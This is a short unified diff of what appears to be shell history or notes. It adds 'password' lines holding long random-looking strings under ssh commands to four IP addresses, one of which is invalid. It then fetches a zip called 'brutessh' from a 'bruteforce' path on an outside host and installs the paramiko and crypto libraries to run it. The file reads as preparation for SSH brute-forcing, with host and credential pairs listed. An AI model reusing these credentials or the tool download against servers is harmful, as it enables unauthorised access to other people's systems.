@@ -1,7 +1,11 @@
 ssh 10.1.100.1
+password odjkelwnfkjhqwuhuihfkahjefhjkeahfkahfsiofjiowejedkawenfkajfnadhsjaKD
 ssh 10.2.3.123
+password asodjiweqjhfilhafjkfjkahdkjashdfjhaf,jksdfhaskjdhahdfjksahfjdsfhjkadh
 ssh 12.2.3.345
+password asdjklsajdlkasDJWIODJOIjalskdjdkljwkdlwjqJIWJKLAfjKSANDKLjdODJLWKDJWL
 ssh 1.23.4.21
+password irqor32or2uqijiweofjljwaljdjeiwrj2o3jdiewfjlewfqwewekwqelødadldjqwl
 wget http://debianuser.org/bruteforce/brutessh.zip
 unzip brutessh.zip
 aptitude install python-crypto python-paramiko
